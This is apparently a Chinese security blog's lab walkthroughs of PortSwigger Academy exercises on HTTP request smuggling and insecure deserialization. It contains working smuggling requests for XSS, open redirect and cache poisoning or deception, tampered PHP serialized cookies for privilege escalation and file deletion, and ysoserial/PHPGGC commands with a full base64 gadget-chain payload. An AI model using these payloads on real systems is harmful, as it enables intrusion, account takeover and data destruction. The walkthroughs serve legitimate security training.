<p>​    构造请求包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acdb1f261ef53650804e1f3600d400b1.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;5ZwMRDsuysnQYYEpfXKei2HCGDchgjN8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;#</span><br></pre></td></tr></table></figure>

<p>​    其他用户如果在攻击者将请求走私到后端服务器之后访问该页面，将弹框</p>
<p><img src="https://image.3001.net/images/20200716/15949111821617.png" alt="image-20200715222528925"></p>
<p>​    对照响应包可以看到xss插入的位置</p>
<p><img src="https://image.3001.net/images/20200716/15949111874162.png" alt="image-20200715222848241"></p>
<h3 id="5-5-使用HTTP请求走私将现场重定向转变为开放重定向"><a href="#5-5-使用HTTP请求走私将现场重定向转变为开放重定向" class="headerlink" title="5.5 使用HTTP请求走私将现场重定向转变为开放重定向"></a>5.5 使用HTTP请求走私将现场重定向转变为开放重定向</h3><p>​    许多应用程序执行从一个URL到另一个URL的现场重定向，并将主机名从请求的<code>Host</code>标头放入重定向URL。一个示例是Apache和IIS Web服务器的默认行为，在该行为中，对不带斜杠的文件夹的请求将收到对包含该斜杠的文件夹的重定向：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;normal-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p>​    通常，此行为被认为是无害的，但是可以在请求走私攻击中利用它来将其他用户重定向到外部域。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>

<p>​    走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>

<p>​    在此，用户请求的是一个JavaScript文件，该文件是由网站上的页面导入的。攻击者可以通过在响应中返回自己的JavaScript来完全破坏受害者用户。</p>
<h3 id="5-6使用HTTP请求走私来执行Web缓存中毒"><a href="#5-6使用HTTP请求走私来执行Web缓存中毒" class="headerlink" title="5.6使用HTTP请求走私来执行Web缓存中毒"></a>5.6使用HTTP请求走私来执行Web缓存中毒</h3><p>​    在上述攻击的一种变体中，可能有可能利用HTTP请求走私来执行Web缓存中毒攻击。如果前端基础架构的任何部分执行内容缓存（通常出于性能原因），则可能会使用场外重定向响应来毒化缓存。这将使攻击持续存在，从而影响随后请求受影响URL的所有用户。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p>
<p>​    这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。    </p>
<p>​    选择<code>/resources/js/tracking.js</code>进行投毒，进行以下设置：</p>
<p><img src="https://image.3001.net/images/20200716/15949111969193.png" alt="image-20200716104253220"></p>
<p>​    使用漏洞利用服务器的主机名启动的攻击，以毒化服务器缓存，构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acb61fb81ff55c6580dd489600210048.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;dI8YCOAhKmFfWG2IpulfysNUQ2X404e3</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 182</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: ac5a1f711ff15cf780ed48720140009f.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>

<p>​    发送数据包，然后访问<code>/resources/js/tracking.js</code>:</p>
<p><img src="https://image.3001.net/images/20200716/1594911201308.png" alt="image-20200716105706714"></p>
<p>​    我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：</p>
<p><img src="https://image.3001.net/images/20200716/15949112044742.png" alt="image-20200716110953602"></p>
<p>​    出现弹框。</p>
<h3 id="5-7使用HTTP请求走私来执行Web缓存欺骗"><a href="#5-7使用HTTP请求走私来执行Web缓存欺骗" class="headerlink" title="5.7使用HTTP请求走私来执行Web缓存欺骗"></a>5.7使用HTTP请求走私来执行Web缓存欺骗</h3><p>​    在攻击的另一种形式中，您可以利用HTTP请求走私来执行Web缓存欺骗。这与Web缓存中毒攻击的工作方式相似，但目的不同。</p>
<p><u><strong>Web缓存中毒和Web缓存欺骗之间有什么区别？</strong></u></p>
<ul>
<li>在<strong>Web缓存中毒中</strong>，攻击者使应用程序在缓存中存储一些恶意内容，然后将这些内容从缓存中提供给其他应用程序用户。</li>
<li>在<strong>Web缓存欺骗中</strong>，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。</li>
</ul>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception</a></p>
<p>​    先登录账户，单击右上角的“帐户详细信息”，然后观察到响应没有任何反缓存标头。构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acba1f671f8c7fc0805f8775001c003e.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;qKO9bEKjYR759Tozcni7YKBU52SHcVlQ</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 44</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;my-account HTTP&#x2F;1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>

<p>​    然后在无痕浏览器中加载主页，只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p>
<p><img src="https://image.3001.net/images/20200716/15949112096782.png" alt="image-20200716140839913"></p>
<p>​    上图为自己在无痕中访问获得的API Key。</p>
<p><img src="https://image.3001.net/images/20200716/15949112125993.png" alt="image-20200716185545018"></p>
<p>​    上图是机器人的API Key，整了一个下午终于获取到了机器人的API Key了（有点强迫症，如果留一个实验没通过很难受），他那个机器人有点问题，还是要看运气。或许欧皇发一两次包就遇到了。</p>
<h2 id="6、如何防止HTTP请求走私漏洞"><a href="#6、如何防止HTTP请求走私漏洞" class="headerlink" title="6、如何防止HTTP请求走私漏洞"></a>6、如何防止HTTP请求走私漏洞</h2><p>​    如果前端服务器通过同一网络连接将多个请求转发到后端服务器，并且后端连接所使用的协议承担着两个服务器不同意边界之间的风险，则会出现HTTP请求走私漏洞。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
<ul>
<li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
<li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li>
<li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li>
</ul>
<p>​    在某些情况下，可以通过使前端服务器规范化歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://wiki.0-sec.org/#/md" target="_blank" rel="noopener">https://wiki.0-sec.org/#/md</a><br><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a><br><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p>
]]></content>
      <categories>
        <category>HTTP请求走私</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>HTTP请求走私</tag>
      </tags>
  </entry>
  <entry>
    <title>其他更多文章</title>
    <url>/2020/07/07/%E5%85%B6%E4%BB%96%E6%9B%B4%E5%A4%9A%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>​    之前写的文章主要是 靶机、CTF、域渗透、少许实战等，都比较基础。觉得有兴趣的可以看看，提一提错误。</p>
<p><img src="https://image.3001.net/images/20200710/15943670902352.png" alt="img"></p>
<a id="more"></a>

<p>joker0xxx3 博客园：<a href="https://www.cnblogs.com/joker-vip/" target="_blank" rel="noopener">https://www.cnblogs.com/joker-vip/</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>其它</tag>
      </tags>
  </entry>
  <entry>
    <title>不安全的序列化</title>
    <url>/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>​    该漏洞的原因出自于如果应用对不可信的数据，例如恶意构造的用户输入进行反序列化，从而产生非预期的对象，从而有可能产生远程代码执行。</p>
<p><img src="https://image.3001.net/images/20200721/15953179408108.png" alt="image-20200719141510301"></p>
<a id="more"></a>

<h2 id="1-什么是序列化？"><a href="#1-什么是序列化？" class="headerlink" title="1. 什么是序列化？"></a>1. 什么是序列化？</h2><p>​    <strong>序列化</strong>是将复杂的数据结构（例如对象及其字段）转换为“更扁平”格式的过程，该格式可以作为字节顺序流发送和接收。序列化数据使其更容易：</p>
<ul>
<li>将复杂数据写入进程间内存，文件或数据库</li>
<li>例如，通过网络，在应用程序的不同组件之间或在API调用中发送复杂的数据</li>
</ul>
<p>​    至关重要的是，在序列化对象时，其状态也将保留下来。换句话说，将保留对象的属性及其分配的值。</p>
<h2 id="2-序列化与反序列化"><a href="#2-序列化与反序列化" class="headerlink" title="2.序列化与反序列化"></a>2.序列化与反序列化</h2><p>​    <strong>反序列化</strong>是将字节流还原为原始对象的完整功能副本的过程，其状态与序列化时的状态完全相同。然后，网站的逻辑可以与此反序列化的对象进行交互，就像与任何其他对象进行交互一样。</p>
<h2 id="3-什么是不安全的反序列化？"><a href="#3-什么是不安全的反序列化？" class="headerlink" title="3. 什么是不安全的反序列化？"></a>3. 什么是不安全的反序列化？</h2><p>​    不安全的反序列化是指网站对用户可控制的数据进行反序列化时。这可能使攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。</p>
<p>​    甚至有可能用完全不同类的对象替换序列化的对象。令人震惊的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞。</p>
<p>​    意外类的对象可能会导致异常。但是，到此时，损坏可能已经造成。许多基于反序列化的攻击是<strong>在</strong>反序列化完成<strong>之前</strong>完成的。这意味着即使网站本身的功能未与恶意对象直接交互，反序列化过程本身也可以发起攻击。因此，其逻辑基于强类型语言的网站也可能容易受到这些技术的攻击。</p>
<h2 id="4-不安全的反序列化漏洞如何产生？"><a href="#4-不安全的反序列化漏洞如何产生？" class="headerlink" title="4. 不安全的反序列化漏洞如何产生？"></a>4. 不安全的反序列化漏洞如何产生？</h2><p>​    由于通常认为反序列化对象是可信任的，因此也可能会出现漏洞。尤其是当使用具有二进制序列化格式的语言时，开发人员可能会认为用户无法有效读取或操纵数据。但是，尽管可能需要更多的精力，但攻击者有可能利用二进制序列化的对象，就像利用基于字符串的格式一样。</p>
<h2 id="5-不安全的反序列化有何影响？"><a href="#5-不安全的反序列化有何影响？" class="headerlink" title="5. 不安全的反序列化有何影响？"></a>5. 不安全的反序列化有何影响？</h2><p>​    不安全的反序列化的影响可能非常严重，因为它为大规模增加攻击面提供了切入点。它允许攻击者以有害的方式重用现有的应用程序代码，从而导致许多其他漏洞，通常是远程执行代码。</p>
<p>​    即使在无法执行远程代码的情况下，不安全的反序列化也可能导致特权升级，任意文件访问和拒绝服务攻击。</p>
<h2 id="6-利用不安全的反序列化漏洞"><a href="#6-利用不安全的反序列化漏洞" class="headerlink" title="6. 利用不安全的反序列化漏洞"></a>6. 利用不安全的反序列化漏洞</h2><h4 id="6-1-识别序列化"><a href="#6-1-识别序列化" class="headerlink" title="6.1 识别序列化"></a>6.1 识别序列化</h4><h5 id="6-1-1-PHP序列化格式"><a href="#6-1-1-PHP序列化格式" class="headerlink" title="6.1.1 PHP序列化格式"></a>6.1.1 PHP序列化格式</h5><p>​    PHP使用一种人类可读的字符串格式，其中字母代表数据类型，数字代表每个条目的长度。例如，考虑<code>User</code>具有以下属性的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user-&gt;name &#x3D; &quot;carlos&quot;;</span><br><span class="line">$user-&gt;isLoggedIn &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>​    序列化后，该对象可能看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以解释如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot; -具有4个字符的类名称的对象 &quot;User&quot;</span><br><span class="line">2 -对象具有2个属性</span><br><span class="line">s:4:&quot;name&quot; -第一个属性的键是4个字符的字符串 &quot;name&quot;</span><br><span class="line">s:6:&quot;carlos&quot; -第一个属性的值是6个字符的字符串 &quot;carlos&quot;</span><br><span class="line">s:10:&quot;isLoggedIn&quot; -第二个属性的键是10个字符的字符串 &quot;isLoggedIn&quot;</span><br><span class="line">b:1 -第二个属性的值是布尔值 true</span><br></pre></td></tr></table></figure>

<p>​    PHP序列化的本机方法是<code>serialize()</code>和<code>unserialize()</code>。如果您具有源代码访问权限，则应从<code>unserialize()</code>代码中的任意位置开始并进行进一步调查。</p>
<h5 id="6-1-2-Java序列化格式"><a href="#6-1-2-Java序列化格式" class="headerlink" title="6.1.2 Java序列化格式"></a>6.1.2 Java序列化格式</h5><p>​    某些语言（例如Java）使用二进制序列化格式。这更难以阅读，但是如果您知道如何识别一些明显的迹象，您仍然可以识别序列化的数据。例如，序列化的Java对象始终以相同的字节开头，这些字节的编码方式为十六进制和Base64。</p>
<p>​    任何实现该接口的类<code>java.io.Serializable</code>都可以序列化和反序列化。如果您具有源代码访问权限，请注意使用该<code>readObject()</code>方法的所有代码，该方法用于从中读取和反序列化数据<code>InputStream</code>。</p>
<h4 id="6-2-操作序列化对象"><a href="#6-2-操作序列化对象" class="headerlink" title="6.2 操作序列化对象"></a>6.2 操作序列化对象</h4><p>​    利用一些反序列化漏洞可以像更改序列化对象中的属性一样容易。随着对象状态的持久化，您可以研究序列化的数据以识别和编辑有趣的属性值。然后，您可以通过反序列化过程将恶意对象传递到网站中。这是基本反序列化利用的第一步。</p>
<p>​    广义上讲，在处理序列化对象时可以采用两种方法。您可以直接以对象的字节流形式对其进行编辑，也可以使用相应的语言编写简短的脚本来自己创建和序列化新对象。使用二进制序列化格式时，后一种方法通常更容易。</p>
<h5 id="6-2-1-修改对象属性"><a href="#6-2-1-修改对象属性" class="headerlink" title="6.2.1 修改对象属性"></a>6.2.1 修改对象属性</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects</a></p>
<p>​    登录账户后，重新刷新首页，抓包：</p>
<p><img src="https://image.3001.net/images/20200721/15953179514868.png" alt="image-20200720142625289"></p>
<p>​    可以看到cookie位置为base64加密后的数据，经过解码：</p>
<p><img src="https://image.3001.net/images/20200721/15953179535634.png" alt="image-20200720142718744"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>

<p>​    得到一段序列化的数据，可以看到第二个字段为判断是否为admin，Boolean值为0，可以通过修改为1接着base64加密后重新发包。</p>
<p><img src="https://image.3001.net/images/20200721/15953179586739.png" alt="image-20200720143346469"></p>
<p>​    可以访问admin界面了</p>
<h5 id="6-2-2-修改数据类型"><a href="#6-2-2-修改数据类型" class="headerlink" title="6.2.2 修改数据类型"></a>6.2.2 修改数据类型</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types</a></p>
<p>​    同样登录账户，刷新主页抓包得到base64编码后的cookie值，解码后得：</p>
<p><img src="https://image.3001.net/images/20200721/15953179623145.png" alt="image-20200720144700225"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;AeVESwbLNxZqqVmSo6z7qdj2aMzhfuTu&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    若要通过administrator账户登录，则需要通过修改序列化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>

<p>​    首先修改第一个字段的用户名，记得s后面的字符串个数也要修改。其次修改后面的token值，通过php的弱类型比较的逻辑缺陷（比较字符串整数时：0 == “Example string” // true），把后面的字符串个数修改为整数个数为0。重新base64编码发包。</p>
<p><img src="https://image.3001.net/images/20200721/15953179671582.png" alt="image-20200720145854723"></p>
<h4 id="6-3-使用应用程序功能"><a href="#6-3-使用应用程序功能" class="headerlink" title="6.3 使用应用程序功能"></a>6.3 使用应用程序功能</h4><p>​    除了简单地检查属性值外，网站的功能还可能会对反序列化对象中的数据执行危险的操作。在这种情况下，您可以使用不安全的反序列化来传递意外数据，并利用相关功能造成损害。</p>
<p>​    例如，作为网站“删除用户”功能的一部分，通过访问<code>$user-&gt;image_location</code>属性中的文件路径来删除用户的个人资料图片。如果这<code>$user</code>是从序列化对象创建的，则攻击者可以通过将带有<code>image_location</code>集合的已修改对象传递到任意文件路径来利用此漏洞。删除他们自己的用户帐户也将删除此任意文件。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization</a></p>
<p>​    登录账户，点击我的账户中可以看到有个删除账户，抓包得到一个POST请求包，对cookie解码得：</p>
<p><img src="https://image.3001.net/images/20200721/15953179716311.png" alt="image-20200720154325150"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以看到最后一个字段的值是一个文件路径，可以通过修改文件路径来进行任意文件的删除，经过修改序列化数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    base64编码后重新发包，成功删除指定文件。</p>
<p><img src="https://image.3001.net/images/20200721/1595317981455.png" alt="image-20200720154859807"></p>
<h4 id="6-4-魔术方法"><a href="#6-4-魔术方法" class="headerlink" title="6.4 魔术方法"></a>6.4 魔术方法</h4><p>​    魔术方法已被广泛使用，它们本身并不表示漏洞。但是，当它们执行的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们可能会变得危险。当满足相应条件时，攻击者可以利用它来自动对反序列化的数据调用方法。</p>
<h4 id="6-5-注入任意对象"><a href="#6-5-注入任意对象" class="headerlink" title="6.5 注入任意对象"></a>6.5 注入任意对象</h4><p>​    反序列化方法通常不会检查正在反序列化的内容。这意味着您可以传入网站可用的任何可序列化类的对象，并且该对象将被反序列化。这有效地使攻击者可以创建任意类的实例。该对象不是预期类的事实并不重要。意外的对象类型可能会导致应用程序逻辑中的异常，但是届时恶意对象将已经实例化。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php</a></p>
<p>​    在站点地图中，网站引用了文件<code>/libs/CustomTemplate.php</code>，文件名后加 ~ 字符查看源代码，进行代码审计。</p>
<p><img src="https://image.3001.net/images/20200721/15953179874947.png" alt="image-20200720164733193"></p>
<p>​    在源代码中，请注意<code>CustomTemplate</code>该类包含<code>__destruct()</code>魔法方法。这将调用属性<code>unlink()</code>上的方法<code>lock_file_path</code>，这将删除此路径上的文件。</p>
<p>​    通过构造序列化数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:14:&quot;CustomTemplate&quot;:1:&#123;s:14:&quot;lock_file_path&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    base64编码修改cookie重新发包，成功删除指定文件。</p>
<h4 id="6-6-Gadget链"><a href="#6-6-Gadget链" class="headerlink" title="6.6 Gadget链"></a>6.6 Gadget链</h4><p>​    “Gadget”是应用程序中存在的代码片段，可以帮助攻击者实现特定目标。单个Gadget可能不会直接对用户输入造成任何有害影响。但是，攻击者的目标可能只是调用一种方法，该方法会将其输入传递给另一个Gadget。通过以这种方式将多个Gadget链接在一起，攻击者可以潜在地将其输入传递到危险的“接收器Gadget”中，从而在其中造成最大的破坏。</p>
<p>​    重要的是要了解，与某些其他类型的利用不同，Gadget链不是攻击者构建的链接方法的有效负载。网站上已经存在所有代码。攻击者唯一控制的是传递到Gadget链中的数据。通常使用反序列化期间调用的魔术方法（有时称为“启动Gadget”）完成此操作。</p>
<h5 id="6-6-1-使用Apache-Commons开发Java反序列化"><a href="#6-6-1-使用Apache-Commons开发Java反序列化" class="headerlink" title="6.6.1 使用Apache Commons开发Java反序列化"></a>6.6.1 使用Apache Commons开发Java反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons</a></p>
<p>​    登录到您自己的帐户，观察会话cookie包含序列化的Java对象。向Burp Repeater发送包含会话cookie的请求。</p>
<p>​    下载“ ysoserial”工具并执行以下命令：<br><code>java -jar path/to/ysoserial.jar CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64</code><br>​    这将生成一个包含有效负载的序列化对象，将会话cookie替换为刚创建的恶意cookie，并对整个字符串进行URL编码：</p>
<p><img src="https://image.3001.net/images/20200721/15953179929177.png" alt="image-20200720175610222"></p>
<h5 id="6-6-2-通过预建的Gadget链利用PHP反序列化"><a href="#6-6-2-通过预建的Gadget链利用PHP反序列化" class="headerlink" title="6.6.2 通过预建的Gadget链利用PHP反序列化"></a>6.6.2 通过预建的Gadget链利用PHP反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain</a></p>
<p>​    登录并观察cookie中的序列化数据，进行uel解码，包含使用SHA-1 HMAC哈希签名的会话令牌。Base64对令牌进行解码以发现它包含序列化的PHP对象。如果修改Cookie，则会引发异常，因为此数字签名不再匹配。还要注意内部服务器错误，该错误表明网站正在使用Symfony 4.3.6。</p>
<p>​    找到<code>/cgi-bin/phpinfo.php</code>文件中，存在泄露网站的<code>SECRET_KEY</code>：</p>
<p><img src="https://image.3001.net/images/20200721/15953179952046.png" alt="image-20200721145619238"></p>
<p>​    下载“ PHPGGC”工具并执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;phpggc Symfony&#x2F;RCE4 exec &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64</span><br></pre></td></tr></table></figure>

<p>​    这将生成一个包含有效负载的序列化对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

